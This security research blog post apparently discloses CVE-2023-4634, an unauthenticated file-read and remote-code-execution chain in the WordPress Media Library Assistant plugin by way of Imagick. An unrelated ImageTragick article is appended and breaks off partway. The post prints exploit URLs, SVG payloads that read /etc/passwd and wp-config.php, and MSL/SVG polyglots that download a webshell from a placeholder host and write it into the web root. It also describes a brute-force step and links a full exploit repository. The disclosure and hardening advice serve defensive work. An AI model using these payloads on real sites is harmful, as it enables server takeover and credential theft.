As discussed in many of our articles, you already know that WordPress and related plugins are taking up a large space in the global attack surface we are monitoring for our customers.

Discovering always new methods and techniques to exploit potential flaws on these technologies allows us to be pro-active and try to maintain an advantage over potential attackers.

The vulnerability described below is a perfect example of that proactivity: we promptly alerted all our customers who were using the vulnerable plugins, even before the fix for the vulnerability became available (in most cases, our clients either disabled the plugin or implemented a custom fix provided by us).

## When You’re Lost in the Web

The first alert that raised our automatization was a confirmed Local File Inclusion (LFI) in a WordPress plugin called “Media Library Assistant” : <https://www.cvedetails.com/cve/CVE-2020-11732/>, the plugin has more than 70k active installation, not a bestseller but still interesting from an attacker perspective (to build a botnet, deploy ransomware...): <https://fr.wordpress.org/plugins/media-library-assistant/>

The plugin was indeed vulnerable regarding the version, but our automation was unable to go further (it has now been improved 😁).

In reality, Local File Inclusion vulnerabilities in WordPress are typically valuable for accessing critical files like `wp-config.php`. However, in the case of this specific vulnerability, it only works with an absolute path (as noted in the packetstorm exploit).

There is a file inclusion vulnerability in the mla-file-downloader.php file. Example:

```
http://server/wordpress/wp-content/plugins/media-library-assistant/includes/mla-file-downloader.php?mla_download_type=text/html&mla_download_file=C:\Bitnami\wordpress-5.3.2-2\apps\wordpress\htdocs\wp-content\plugins\updraftplus\options.php
```

Patrowl automatization did not managed to identify a full path disclosure vulnerability elsewhere on the website, and all classic bruteforced path did not work.

This the moment chooses by our automatization to request a more in-depth investigation from a pentester.

The process is classic, and if you already read one of our articles, you likely familiar with the procedure: setting up a lab environment with the latest plugin version installed.
Originally, the plan was to identify in the plugin, a method that could trigger a full path disclosure and help the machine to go deeper in the exploitation. But we found a much more interesting and challenging vulnerability, bringing back old memories.

## Left Behind

The initial discovery (CVE-2020-11732) was targeting the `mla-file-downloader.php` file locate in the `includes` folder of the plugin directory.
A small stand-alone file now patched since a long time:

```
<?php
/**
 * Stand-alone file download handler for the [mla_gallery]
 *
 * @package Media Library Assistant
 * @since 2.32
 */

/*
 * Process [mla_gallery link=download] requests
 */
//@ini_set('error_log','C:\Program Files (x86)\Apache Software Foundation\Apache24\logs\php-errors.log');

require_once( pathinfo( __FILE__, PATHINFO_DIRNAME ) . '/class-mla-file-downloader.php' );

MLAFileDownloader::mla_process_download_file( array( 'error' => 'MLA File Downloader no longer supported because it allowed Local File Disclosure attacks.' ) );

// NO LONGER ALLOWED AS OF v2.82
if ( isset( $_REQUEST['mla_download_file'] ) && isset( $_REQUEST['mla_download_type'] ) ) {
    MLAFileDownloader::$mla_debug = isset( $_REQUEST['mla_debug'] ) && 'log' == $_REQUEST['mla_debug'];
    MLAFileDownloader::mla_process_download_file();
}

MLAFileDownloader::mla_die( 'MLA File Download parameters not set', __LINE__, 500 );
?>
```

The direct access to `mla-file-downloader.php` is now not allowed anymore. The first `require_once` is indeed now pointing to a file (class-mla-file-downloader.php) including the magic WordPress condition:

```
defined( 'ABSPATH' ) or die();
```

The condition disallows direct access to WordPress PHP files. So whatever we will do, the `die()` will systematically be called when reaching the `mla-file-downloader` directly. We had to look elsewhere.

The `Stand-alone` reference in the comment is quite interesting. Normally, stand-alone files are created to be reached directly, and with a little bit of luck, unauthenticated.

```
grep -ri "Stand-Alone" --include \*.php
./includes/mla-file-downloader.php: * Stand-alone file download handler for the [mla_gallery]
./includes/mla-stream-image.php: * Stand-alone stream image handler for the mla_viewer
./includes/class-mla-shortcode-support.php:                      * found by the stand-alone (no WordPress) image stream processor.
./examples/plugins/smart-media-categories/admin/includes/class-smc-automatic-support.php:               // Check for stand-alone terms update, i.e., not part of an insert/update post event
```

The second one seems juicy: `mla-stream-image.php`, let’s have a look.

## Infected

The file has the same structure as the first one and is very easy to understand:

```
<?php
/**
 * Stand-alone stream image handler for the mla_viewer
 *
 * @package Media Library Assistant
 * @since 2.10
 */

/*
 * Process mla_viewer image stream requests

    MLAImageProcessor::mla_process_stream_image();
}

MLAImageProcessor::_mla_die( 'mla_stream_file not set', __LINE__, 500 );
?>
```

But this time, the `class-mla-image-processor.php` is not protected from direct access:

Which indicates that we could reach the function `MLAImageProcessor::mla_process_stream_image()` with an unauthenticated controlled parameter : `$_REQUEST['mla_stream_file']`

The `mla_process_stream_image` is aptly named; it is used to generate thumbnails for local PDF. The function then first check if the file exists locally:

```
$
file = isset( $_REQUEST['mla_stream_file'] ) ? $_REQUEST['mla_stream_file'] : ''; // phpcs:ignore
if ( ! is_file( $file ) ) {
self::_mla_die( 'File not found', __LINE__, 404 );
}
```

If the file exists, it is then passed to the `_ghostscript_convert` function.

Other parameters used for conversion are also within the user's control. But all of them are strongly typed to int or even rewrite, which does not give us a large flexibility in our exploitation path:

```
$use_mutex = isset( $_REQUEST['mla_single_thread'] );
$width = isset( $_REQUEST['mla_stream_width'] ) ? abs( (int) $_REQUEST['mla_stream_width'] ) : 0;
$height = isset( $_REQUEST['mla_stream_height'] ) ? abs( (int) $_REQUEST['mla_stream_height'] ) : 0;
$type = isset( $_REQUEST['mla_stream_type'] ) ? sanitize_text_field( wp_unslash( $_REQUEST['mla_stream_type'] ) ) : 'image/webp';
$quality = isset( $_REQUEST['mla_stream_quality'] ) ? abs( (int) $_REQUEST['mla_stream_quality'] ) : 0;
$frame = isset( $_REQUEST['mla_stream_frame'] ) ? abs( (int) $_REQUEST['mla_stream_frame'] ) : 0;
$resolution = isset( $_REQUEST['mla_stream_resolution'] ) ? abs( (int) $_REQUEST['mla_stream_resolution'] ) : 72;

$ghostscript_path = isset( $_REQUEST['mla_ghostscript_path'] ) ? $_REQUEST['mla_ghostscript_path'] : ''; // phpcs:ignore
if ( ! empty( $ghostscript_path ) ) {
        $ghostscript_path = @file_get_contents( dirname( __FILE__ ) . '/' . 'mla-ghostscript-path.txt' );

$result = self::_ghostscript_convert( $file, $frame, $resolution, $type, $ghostscript_path );
```

The \_ ghostscript\_convert function is a little bit complicated and we did not find any exploitation path from here. It basically searches for the ghostscript executable and execute the appropriate “gs” command line, but with appropriate protection:

```
$cmd = escapeshellarg( $ghostscript_path ) . ' -sDEVICE=%1$s -r%2$dx%2$d -dFirstPage=%3$d -dLastPage=%3$d -dFitPage -o %4$s %5$s 2>&1';
```

If it succeeded, we get then a webp file (type set by default and cannot be changed) of our controlled path.

If the ghostscript\_convert fail, a backup plan is used with Imagick() library:

```
$result = self::_ghostscript_convert( $file, $frame, $resolution, $type, $ghostscript_path );

if ( false === $result ) {
try {
self::$image->readImage( $file . '[' . $frame . ']' );
}
catch ( Exception $e ) {
self::$image->readImage( $file . '[0]' );
 }
```

So, from that, we managed to generate webp extract of PDF or image files located somewhere in the WordPress, ex:
and...

Alright, that's interesting but clearly unexploitable. It might enable us to potentially access specific PDFs stored outside the WordPress Web Directory, but this would require knowing the exact paths to those PDFs (whether absolute or relative), To make it work, you'd have to combine it with another exploit.

Every other format (PHP) will raise an error as the format is not understood either by ghostccript and Imagick. The conversion will then not work, here is an extract of logs when we try to convert a PHP file to webp.

```
wordpress-local-wordpress-1  | [Fri Aug 25 14:49:36.458816 2023] [php:notice] [pid 32] [client 172.19.0.1:58574] 297 _mla_die( 'Image load exception: no decode delegate for this image format `PHP' @ error/constitute.c/ReadImage/575', '537', '404' )
```

As we hate fake unexploitable CVE, and as we love to say in French at Patrowl, let’s “Faire des efforts” (*Make serious efforts*).

## Look for the Imagick

Clearly, since the beginning, our secret goal is to reach the `Imagick()` function with a controlled file. We all know since a long that a misconfigured Imagick library is a goldmine for attackers, and you can find numerous very interesting papers or write-up exploiting the library (see References).
But, to do so, we need to have the `is_file()` used at the beginning of the function to return `True`. The first scenario would be to have a file upload functionality on the WordPress (maybe another plugin), find the uploaded path and use the local controlled file to play with Imagick library.

But no sign of file upload functionality for our WordPress, we had to find another way.

Our immediate though has been to use https:// or http:// remote protocol on the `is_file()` function but with no luck. Looking the documentation, we have a great “tip” given by PHP: <https://www.php.net/manual/en/function.is-file.php>

`is_file` is then working with all wrapper supporting the `stat()` family of functionality. http:// and https://, indeed, do not support `stat()` functionality.

But hello kiddo:

Quick local check, putting an existing arbitrary file on an open FTP server:

```
root@141e013356ca:/var/www/html# php -r "echo(is_file('ftp://X.X.X.X.:2122/test_is_file.txt'));"
1
```

In our remote server:

```
[I 2023-08-25 15:19:23] X.X.X.X:52806-[anonymous] USER 'anonymous' logged in.
[I 2023-08-25 15:19:23] X.X.X.X:52806-[anonymous] CWD /root/test_ftp/test_is_file.txt 550 'Not a directory.'
[I 2023-08-25 15:19:23] X.X.X.X:52806-[anonymous] FTP session closed (disconnect).
```

Awesome!
Now we can use a remote file within the `ghostcript` or `Imagick()` function. The second one is of course much more interesting. Testing with a valid remote controlled FTP hosted image on the plugin gives us:

<http://127.0.0.1/wp-content/plugins/media-library-assistant/includes/mla-stream-image.php?mla_stream_file=ftp://X.X.X.X:2122/test_is_file.txt&mla_debug=log>

```
[I 2023-08-25 15:24:42] X.X.X.X.48:52847-[anonymous] FTP session closed (disconnect).
[I 2023-08-25 15:24:42] X.X.X.X:52849-[] FTP session opened (connect)
[I 2023-08-25 15:24:42] X.X.X.X:52849-[anonymous] USER 'anonymous' logged in.
[I 2023-08-25 15:24:42] X.X.X.X:52849-[anonymous] RETR /root/test_ftp/test_is_file.txt[0] completed=1 bytes=0 seconds=0.0
[I 2023-08-25 15:24:42] X.X.X.X:52849-[anonymous] FTP session closed (disconnect).
```

Bingo, we have the connection from our Wordpress to our FTP. The file asked is `test_is_file.txt[0]`. This is good sign as the `[0]` typically indicates the frame to be converted by Imagick.

Quick look on the logs, we see that the `ghoscript` function will systematically fail when used with an ftp:// filename as input.

We then have what we were looking for: an external controlled image converted by the Imagick() library. We just have to setup 2 files on our ftp server:

* `malicious_file.webp` that could be empty, just to bypass the is\_file() check,
* `malicious_file.webp[0]` which will be converted by Imagick.

Let’s have some fun.

## Endure and Survive

Now, let’s play a little with Imagick library. First, to clarify our speech, Imagick is the PHP library of ImageMagick software. Exploitation path on both software and PHP library are globally the same as the PHP library will use exported C Function of the Software.

Our previous exploits and all existing technical exploitation papers all point to a common conclusion: ImageMagick is an excellent tool for image rendering, but it must be configured with rigorous security policies. Developers of Imagick have had to patch numerous CVEs across thousands of plugins, and they are now quite clear about their stance on vulnerabilities:

“Before you post a vulnerability, first determine if the vulnerability can be mitigated by the security policy. ImageMagick, by default, is open. Use the security policy to add constraints to meet the requirements of your local security governance. »

Now, this becomes intriguing for us. Why? Well, consider this: out of the 70,000 plugins installed, how many developers or system operators are aware that one of their plugins is utilizing Imagick (the PHP library for ImageMagick) with a default open security policy?

A basic installation of the plugins (with Imagick libraries installed on the server) came with this default security policy:

```
<policymap>
  <policy domain="resource" name="memory" value="256MiB"/>
  <policy domain="resource" name="map" value="512MiB"/>
  <policy domain="resource" name="width" value="16KP"/>
  <policy domain="resource" name="height" value="16KP"/>
  <policy domain="resource" name="area" value="128MP"/>
  <policy domain="resource" name="disk" value="1GiB"/>
  <policy domain="delegate" rights="none" pattern="URL" />
  <policy domain="delegate" rights="none" pattern="HTTPS" />
  <policy domain="delegate" rights="none" pattern="HTTP" />
  <policy domain="path" rights="none" pattern="@*"/>
  <policy domain="coder" rights="none" pattern="PS" />
  <policy domain="coder" rights="none" pattern="PS2" />
  <policy domain="coder" rights="none" pattern="PS3" />
  <policy domain="coder" rights="none" pattern="EPS" />
  <policy domain="coder" rights="none" pattern="PDF" />
  <policy domain="coder" rights="none" pattern="XPS" />
</policymap>
```

We can see that some “dangerous” formats are disabled by default like PS or XPS. We could think HTTPs and HTTP patterns are also not allowed by default, but the policy seems to be just here to force Curl internal usage and using http external resource on Imagick() conversion works like a charm with this config.

Now we know that on every instance with the plugins effectively working with a default Imagick configuration, we will be able to use external SVG. Why SVG? let's explore how ImageMagick functions a bit more.

## Please hold to my SVG

All ImageMagick exploits work basically the same. The idea is to force Imagick to use its own internal scripting format called MSL. The MSL format allows to move or create file within the file server.

We can for example, move a remote PHP webshell file within the WordPress directory, where virus.webp just a polyglot webp file with PHP in it.

```
<image>
  <read filename="http://x.x.x.x/8081/virus.webp" />
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="/var/www/html/exploit.php" />
</image>
```

But triggering Imagick MSL parsing is not that easy anymore. When using the PHP Imagick library on images, a first called is made to the `identity` function. Identify will read the image, search for Magic Byte or specific string within the file. The result of the function will then be used as Imagick Parser.

But since Imagetragick, parser will explicitly not recognize dangerous scripting file such as MSL, when you try to parse a MSL file, Imagick will either considered it as SVG or say the format is not recognized.

```
root@141e013356ca:/var/www/html# php -r '$test = new Imagick("/var/www/html/test.msl");'
Fatal error: Uncaught ImagickException: no decode delegate for this image format `' @ error/constitute.c/ReadImage/575 in Command line code:1
```

The only way to get MSL understood by Imagick is to specify the file format before the file using what we will call a `formatter`:

```
root@141e013356ca:/var/www/html# php -r '$test = new Imagick("msl:/var/www/html/test.msl");'
Aborded
```

In our exploit, the controlled path will failed the `is_file()` check if we force the `msl:` formatter within our filename, we have to find another way.
SVG came quickly to our minds. SVG is built to use external files and references. When the Imagick default SVG parser is used, the file is converted in MVG format (Magick Vector Graphics Metafiles). `image` tags with specific inner tags such as `xlink:href` or `path` are transformed into the MVG instruction:

```
image Over %g,%g %g,%g \"%s\"\n »
```

<https://github.com/ImageMagick/ImageMagick/blob/main/coders/svg.c>

From here:

```
if (LocaleCompare((const char *) name,"image") == 0)
        {
          (void) FormatLocaleFile(svg_info->file,
            "image Over %g,%g %g,%g \"%s\"\n",svg_info->bounds.x,
            svg_info->bounds.y,svg_info->bounds.width,svg_info->bounds.height,
            svg_info->url);
          (void) FormatLocaleFile(svg_info->file,"pop graphic-context\n");
          break;
        }
```

Then, the MVG parsing (<https://github.com/ImageMagick/ImageMagick/blob/main/coders/mvg.c-> /) wil finally call the `DrawImage()` function : <https://github.com/ImageMagick/ImageMagick/blob/main/MagickCore/draw.c#L4512>

Which will integrate the `image` MVG in our new image using the ImageMagick `compose` function:

```
if (LocaleCompare("image",keyword) == 0)
          {
            ssize_t
              compose;

            primitive_type=ImagePrimitive;
            (void) GetNextToken(q,&q,extent,token);
            compose=ParseCommandOption(MagickComposeOptions,MagickFalse,token);
            if (compose == -1)
              {
                status=MagickFalse;
                break;
              }
            graphic_context[n]->compose=(CompositeOperator) compose;
```

`Compose` is a specific command from ImageMagick, it allows to combine multiple images, the “Over” parameter used in the SVG parser is just one of the dozen options available for composite ImageMagick <https://imagemagick.org/Usage/compose/#over>

The usage of composite function is then crucial to understand the exploitation. As it used for overlaying or combining multiple images, the function needs to understand specific ImageMagick commands.

Example, if you want to Over a specific text on image you can simply use composite with `text:/path/to/text.txt` and Imagemagick will automatically Over the text on your first image.

```
$composite patrowl.webp text:./patrowl.txt patrowl_over.webp
```

Will add the text of patrowl.txt on the patrowl.webp image.

Now, with a simple SVG, we can control defined ImageMagick formatters, such as MSL, but also all other formatters enabled by default.

## When we are in Need

The first analyses quickly lead us to a smooth LFI. The plugin directly returns the output of Imagick convert function as an http response:

```
// Stream the image back to the requestor
        try {
            header( "Content-Type: $type" );
            echo self::$image->getImageBlob();
```

Then, by using a SVG with a `text:` formatter in it, we can create a blank image on which we will Over as a result the content of the file we want on the file server, we just need to adjust the width and heigh so that we can have something we can read:

Lfi.sfg0 on remote FTP server:

```
<svg width="500" height="500"
xmlns:xlink="http://www.w3.org/1999/xlink">
xmlns="http://www.w3.org/2000/svg">
<image xlink:href= "text:/etc/passwd" width="500" height="500" />
</svg>
```

Exploitation:

```
http://127.0.0.1/wp-content/plugins/media-library-assistant/includes/mla-stream-image.php?mla_stream_file=ftp://X.X.X.X:2122/lfi.svg&mla_debug=log&mla_stream_height=500&mla_stream_width=600
```

Now, we have a nice LFI, from here we can reach and print all WordPress PHP file we want, as the plugin will always be installed in the same directory, the relative path will always be the same.

We just need to adjust the page we want by setting the `mla_stream_frame` to 1 (and don’t forget to have the related `lfi.svg[1]` on the remote FTP).

Lfi.svg1:

```
<svg width="500" height="500"
xmlns:xlink="http://www.w3.org/1999/xlink">
xmlns="http://www.w3.org/2000/svg">
<image xlink:href= "text:../../../../wp-config.php" width="500" height="500" />
</svg>
```

Great, now we can potentially takeover the WordPress (depending on the configuration). But we are so closed to an RCE, we cannot stop here.

## Long, Long Time

To achieve our RCE, we now need a MSL file on the fileserver. Indeed, the msl: formatter does not accept remote file (`msl://http://x.x.x.x` will never work).

The technic used by Synacktiv in their article is using PDF conversion with embed PostScript to write the MSL file within the /tmp folder. Unfortunately, it will not work here since this format are disabled by default on our instance.

After spending hours playing with different format and trying to find one that could create a MSL file within a controlled directory, we discovered during all our tests that hundreds of files have been created in our docker instance within the /tmp folder with the nomenclature: /tmp/magick-\*

Many of them were the MVG converted file from our SVG payloads, but also, the first SVG payload download from our FTP server.

The fact that some files are not deleted by the Imagick process within the /tmp folder still a mystery. We have few clues on self-calling SVG file that could cause segfault and the file not to be deleted: <https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-j96m-mjp6-99xr>

But not exploitable in our configuration as the file came from an external source, it cannot be self-calling.
Taking a closer look, we discovered that for each SVG converted, we have 3 files created in /tmp folder, all using magick-XXX nomenclature (where XXX is a 32-char random string):

* One 0byte file
* One file is the SVG we are converting
* One file is the MVG transition format from Imagick

Note that the location of the /tmp folder used by Imagick could be configured within the policy.xml file. But now that you have LFI, you can quickly spot it if it has been changed.

Then, once the conversion is finished, the 0byte files is not deleted (it will be annoying later you will see) but 2 others are.

Our exploitation idea is then to use 2 files:

* One that will trigger the copy of the file within the /tmp folder during the conversion with MSL scripts in it
* The other, a SVG file, that includes a xlink reference with a msl: forced formatter pointing to the first file created in the /tmp folder.

The idea is good (of course), but requires multiple bypass:

1. To trigger the creation of the temporary file in the /tmp folder, the initial file needs to be a valid format (MSL or Text is not a valid or recognized format).
2. The file is instantly deleted after each conversion
3. The file created use a random name and could not be bruteforced or guessed.

The first problem had been quickly solved using a polyglot SVG/MSL with <https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html> technics.

Then, we were able to trigger the creation of a file in the /tmp/ folder that is valid SVG but also that will be understood ad MSL using the good formatter. Example of polyglot valid file (we will deal with SVG part later).

```
<?xml version="1.0" encoding="UTF-8"?>
<image>
  <read filename="http://X.X.X.X:8081/virus.webp" />
  <resize geometry="400x400" />
  <write filename="/var/www/html/exploit.php" />
  <get width="base-width" height="base-height" />
    <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
        <image xlink:href= text:/etc/passwd height="100" width="100"/>
</svg>
</image>
```

The order of tags is important, the XML declaration needs to be at the beginning to allow the identity function to return SVG. The `image` tags just after and then, the SVG part needs to be inside the image tags, or it will not work.

Then, our file is both understood by msl and svg parser:

```
root@141e013356ca:/var/www/html# ls exploit.php
ls: cannot access 'exploit.php': No such file or directory
root@141e013356ca:/var/www/html# convert poly.svg test.webp
root@141e013356ca:/var/www/html# ls exploit.php
ls: cannot access 'exploit.php': No such file or directory
root@141e013356ca:/var/www/html# convert msl:poly.svg test.webp
Aborted
root@141e013356ca:/var/www/html# ls exploit.php -lah
-rw-r--r-- 1 root root 14K Aug 28 16:17 exploit.php
```

The second problem of the file to be deleted after conversion could be resolved in multiple way:

* Generate a very large SVG file that will take long time to be generated, but with high risk of crashing the process and potentially the server, so we did not choose this way
* Host a very fake large external image (>20Go) called by the SVG. Depending on the network latency, it could take a long time to download (you can host resources in a foreign and distant country to increase the latency), but same problem: dealing with large resource could also provoke unwanted behavior and potential crashes
* The last (and the best), use a non-routed IP. By default, Imagick and PHP have a high timeout (1min), letting you enough time to reach the file before its deletion. It could depend on the PHP configuration so you can use previous method in case the safer is not working.

Example of long SVG conversion:

```
<?xml version="1.0" encoding="UTF-8"?>
    <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <image xlink:href="http://192.192.192.23:1664/neverExist.svg" height="100" width="100"/>
</svg>
```

```
root@141e013356ca:/var/www/html# time php -r '$test = new Imagick("long.svg");'
real    1m0.257s
user    0m0.058s
sys 0m0.114s
```

Then our final Polyglot file SVG file will look like this:

```
<?xml version="1.0" encoding="UTF-8"?>
<image>
  <read filename="http://x.x.x.x:8081/virus.webp" />
  <resize geometry="400x400" />
  <write filename="/var/www/html/exploit.php" />
  <get width="base-width" height="base-height" />
    <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <image xlink:href="http://192.192.192.23:1664/neverExist.svg" height="100" width="100"/>
</svg>
</image>
```

Now, we have our a polyglot SVG/MSL file dropped in /tmp folder for one minute. Last problem (but not least clearly) how to include it using our second SVG? In 1 minute, we cannot bruteforce the 32-char string name.

Here we discover the power of the VID format with this great article about exploitation of another Software using Imagick: <https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/>.

The VID is everything we hoped for, as explained in the article, the VID formatter is using `ExandFilenames()` function on input parameters, which allows usage of wildcard within a folder (<https://github.com/ImageMagick/ImageMagick/blob/main/MagickCore/utility.c#L748>)!

Playing just a little with the format, we quickly understood how powerful it was:

* It is enabled by default
* You can now include specific files without knowing the exact name, the format is quite flexible
* And most of all, in ImageMagick, all formatters could be chained!

You can now use vid formatter with multiple combination.

A double text: formatter to have full directory listing within a directory:
SVG File:

```
<svg width="1000" height="700"
xmlns:xlink="http://www.w3.org/1999/xlink">
xmlns="http://www.w3.org/2000/svg">
<image xlink:href="text:vid:text:/var/www/html/*.php"  width="500" />
</svg>
```

Nice !

Now you see where we are going, VID could also be chained with our dear MSL: `text:vid:msl:/tmp/magick-*`

The order is important, the text formatter needs always to be used in first in SVG xlink tags; then the VID allowing the Call of ExpandFileName then the MSL.

Now we are able to launch MSL parsing on all /tmp/magick-\* file ! the only issue?

If one of the files raise an error, the process will stop, and we will have a 500 Error.

And as you probably remember, we have our old messy 0bytes file that are never deleted within the /tmp folder. The ExpandFileName is sorting file names in alphabetical order, so if we have one 0byte file that has been generated with for instance a 0 or an A, we are doomed, the first file will always raise the error and other file will not be considered.

We must be then more specific.

We know reading the source code that each random filename in /tmp/magick is using 32 random chars selected from the following list:

```
static const char
    portable_filename[65] =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-";
```

<https://github.com/ImageMagick/ImageMagick/blob/main/MagickCore/resource.c>

Then, we can only bruteforce the 65 chars as first characters, using 65 different SVG files, each of them containing a first letter to bruteforce: exploiter\_A.svg containing `text:vid:msl:/tmp/magick-A*`, exploiter\_B.svg containitng
`text:vid:msl:/tmp/magick-B*` ...

With that, we will, with a high level of confidence, find the so wanted SVG/MSL uploaded file without reaching a blank temporary file or another MVG file.

To increase our chances, lets launch the generation of hundreds “long SVG” so that we will be sure one of the bruteforce will work (only one is needed) without any nasty 0byte file before that.

Even if the target has already many non-deleted /tmp/magick file, we will for sure, at one moment, find one that will work using that technic.

Bomb this City and Everyone in It

Now we have all in our hand, we can set up the exploit and the bruteforcer.

All is explained and scripted here:
<https://github.com/Patrowl/CVE-2023-4634/>
The final path of the exploit is then:

* Launch x100 long SVG/MSL polyglot file conversion that will trigger creation of x100 SVG/MSL file in /tmp folder
* Use SVG with VID formatter using wildcard to bruteforce on of the 100 hundreds SVG/MSL filename in /tmp folder with only 65 requests.
* Baboum

We also create a Nuclei template to detect the exploitability (not just the plugin version):
<https://github.com/Patrowl/CVE-2023-4634/blob/master/CVE-2023-4634.yaml>

## SVGs Means Trouble

This exploitation was for us quite interesting to perform, as it highlights the dangerousness of external libraries that could be used in WordPress Plugins. Not sure WordPress administrator has a clean view of the configuration of each external library used, especially of Imagick that came directly installed with a “basic” instance of Wordpress.

As explained in the article, the position of Imagemagick teams is clear and they are quite reactive on security subject. We warned them about the dangerousness of SVG Parsing, and default allowing of SVG, but their response was what we expected:

\*While it's possible to defend against certain vulnerabilities, such as the use of SVG's xlink, through a definition mechanism, it's not a robust security approach. For instance, xlink would remain inactive by default unless a specific definition is specified. Yet, this strategy proves inadequate as it's akin to a temporary solution, and we would be continuously reacting to emerging vulnerabilities until the next one emerges. The security policy was designed specifically to address potentially unknown exploits. If a new exploit is discovered, the user is protected by invoking the appropriate security policy. The result is immediate protection against the exploit without the need to update the binary distribution.

Security is a compromise between security and convenience. The open nature of ImageMagick allows any user to exploit all the features of the package in a secure environment such as Docker, yet the security policy allows an administrator to selectively lock out features per their local context in a more open environment such as a public web site. For any public web site, we recommend these coders: MSL, MSVG, MVG, PS, PDF, RSVG, SVG, XPS, be disabled in the security policy.\*

**To be clear**, if you are a WordPress administrator, you must reinforce your default security Imagick policies located in `/etc/ImageMagick-X/policy.xml`, to disallow MSL, MSVG, MVG, PS, PDF, RSVG, SVG, XPS (especially SVG not disable by default which is for us one of the dangerous one). Even if you think that your WordPress does not use this library.

Regarding the plugin itself, special thanks to David Lingren which has been quite reactive for the fix (3.10 version).

Finally, all Patrowl customers using this plugin were warned. The plugins have been disabled during the time of patching, and then re-enabled the plugin when 3.10 has been released with the correction. Some of them even restrict Imagick libraries to be sure.

### Description

The Media Library Assistant plugin for WordPress is vulnerable to Local File Inclusion and Remote Code Execution in versions up to, and including, 3.09. This is due to insufficient controls on file paths being supplied to the 'mla\_stream\_file' parameter from the ~/includes/mla-stream-image.php file, where images are processed via Imagick(). This makes it possible for unauthenticated attackers to supply files via FTP that will make directory lists, local file inclusion, and remote code execution possible.

# Playing with ImageTragick like it's 2016

You probably already have encountered document converting features that deal with ImageMagick during engagements but for some reason you were not able to exploit them. This article will mention some techniques that could be used when an older version of ImageMagick is targeted.

Spoiler alert: this is not new.

*ImageMagick[1](playing-with-imagetragick-like-its-2016#footnote1_4dtn4tx "ImageMagick: https://imagemagick.org/")* is an image manipulation tool that can read and write images in a lot of formats. Several dangerous features and vulnerabilities were previously found on *ImageMagick* and were fixed over time. These issues were unveiled by two interesting articles:

* *ImageTragick*[2](playing-with-imagetragick-like-its-2016#footnote2_rot3pmj "Make ImageMagick Great Again: https://imagetragick.com/") during 2016, that details a set of vulnerabilities, including command injections in *URL* manipulations, and features that allow arbitrary file read and write.
* *A* shell injection on the *PDF* file format found by InsertScript[3](playing-with-imagetragick-like-its-2016#footnote3_615iw3i "ImageMagick - Shell injection via PDF password: https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-â¦") and disclosed at the end of 2020.

On this blog post, we will focus on the latest *ImageMagick* version available on the *Debian Buster* repositories[4](playing-with-imagetragick-like-its-2016#footnote4_pu55ie0 "Details of package imagemagick in buster: https://packages.debian.org/buster/imagemagick"). At the time this article is written, the available version is:

> ```
>
> Version: ImageMagick 6.9.10-23 Q16 x86_64 20190101 https://imagemagick.org
> Copyright: Â© 1999-2019 ImageMagick Studio LLC
> ```

This legacy version, that can be easily installed, is considered deprecated as some features are not disabled, even if thecommand injection vulnerabilities have been fixed. It should be noted that we were not able to exploit theÂ *PDF* command injection on *ImageMagick* legacy as it seems the *PDF authentication* feature was broken on this version, as stated in the InsertScript*'s* article[3](playing-with-imagetragick-like-its-2016#footnote3_615iw3i "ImageMagick - Shell injection via PDF password: https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-â¦").

We will discuss here in which context some harmful features can still be exploited, and we will give an implementation example that uses the aforementioned deprecated version.

# Context

## Policies

*ImageMagick* divides different file formats in *coders* that can be disabled in a *policy.xml* file. As documented in the *ImageTragick[2](playing-with-imagetragick-like-its-2016#footnote2_rot3pmj "Make ImageMagick Great Again: https://imagetragick.com/")* website, the *policy.xml* file should be modified in order to prevent vulnerable coders such as *MSL*.

However, the default *policy.xml* file shipped with *ImageMagick* is not always well configured. For example, the one distributed on the *Debian* package *imagemagick-6-common* only disables the *Ghostscript* coders:

```

<policymap>
  <!-- <policy domain="resource" name="temporary-path" value="/tmp"/> -->
[...]
  <!-- use curl -->
  <policy domain="delegate" rights="none" pattern="URL" />
  <policy domain="delegate" rights="none" pattern="HTTPS" />
  <policy domain="delegate" rights="none" pattern="HTTP" />
  <!-- in order to avoid to get image with password text -->
  <policy domain="path" rights="none" pattern="@*"/>
  <!-- disable ghostscript format types -->
  <policy domain="coder" rights="none" pattern="PS" />
  <policy domain="coder" rights="none" pattern="PS2" />
  <policy domain="coder" rights="none" pattern="PS3" />
  <policy domain="coder" rights="none" pattern="EPS" />
  <policy domain="coder" rights="none" pattern="PDF" />
  <policy domain="coder" rights="none" pattern="XPS" />
</policymap>

```
## Invoking ImageMagick

Files are usually provided to the *convert* command-line tool of *ImageMagick*. For example, the following command-line asks *ImageMagick* to convert an image file to the *PDF* format:

```

$ convert sample.png result.pdf
```

One could notice the default policy will never allow such operations as the *PDF* coder is disabled. Let's say it is now enabled and the line is removed from the *policy.xml* file *for convenience*:

```

  <policy domain="coder" rights="none" pattern="EPS" />
  <!-- <policy domain="coder" rights="none" pattern="PDF" /> -->
  <policy domain="coder" rights="none" pattern="XPS" />
```
## File formats

*ImageMagick* recognizes the format (and the coder) associated to each provided file according to the magic bytes contained on the file. For example, the following magic bytes are defined for the *PDF* file format:

```

//coders/pdf.h
//[...]
#define MagickPDFHeaders \
  MagickCoderHeader("PDF", 0, "%PDF-")
//[...]

//coders/pdf.c
//[...]
static MagickBooleanType IsPDF(const unsigned char *magick,const size_t offset)
{
  if (offset < 5)
    return(MagickFalse);
  if (LocaleNCompare((const char *) magick,"%PDF-",5) == 0)
    return(MagickTrue);
  return(MagickFalse);
}
//[...]

```

*ImageMagick* also infers the file type from the file name's extension. Let's say we have a filename that has the *pdf* extension, providing it to the *convert* command-line tool will force the *PDF* coder, even if its content is not valid:

```

$ cat sample.pdf
Not a pdf file

$ cp sample.pdf sample

$ convert sample.pdf out.png
Error: /stackunderflow in --not--
[...]
